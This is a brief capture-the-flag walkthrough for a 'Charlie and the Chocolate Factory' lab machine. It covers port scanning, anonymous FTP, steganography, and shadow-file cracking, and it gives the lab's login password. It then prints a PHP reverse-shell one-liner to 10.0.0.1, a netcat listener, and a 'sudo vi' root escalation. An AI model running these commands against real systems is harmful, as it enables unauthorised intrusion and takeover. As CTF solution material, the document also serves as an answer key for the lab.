---
title: charlie and the chocolate factory CTF
premalink: /chocolate
---
# Charlie and the Chocolate Factory

## Open Ports:
```
nmap -A $IP
```

## netcat 
netcat to all prots from 100 - 125
```
nc $IP 100
nc $IP 113
```
* found a link in port **113** : http://localhost/key_rev_key
* found a key file in link
* Revers engineering the file
```
strings key
```

## Ftp

* Anonymous login
* found an image 
```
get gumroom.jpg
```
* extract the image
```
steghide extarct -sf gumroom.jpg
```
* found b64.txt which has base64 encoded text
* decoding the text

* user password shadow file found
* crack the shadow file usig johnny


## Port 80
* Enter the username: charlie
* Enter the password found after cracking : cn7824

* After login found a bar that executes os commands
* Gaining reverse shell
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
* start listner
```
nc -lvnp 1234
```

** Now you have the access to the machine**
* go to /home/charlie

```
cat uesr.txt
```
## root 

* start tty
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
* see the permissions you have
```
sudo -l
```

* permission to run *vi* as sudo 
```
sudo vi -c '!/bin/bash'
```
* now you are root
* go to /root
```
python root.py
```
* Enter the key found after reversing

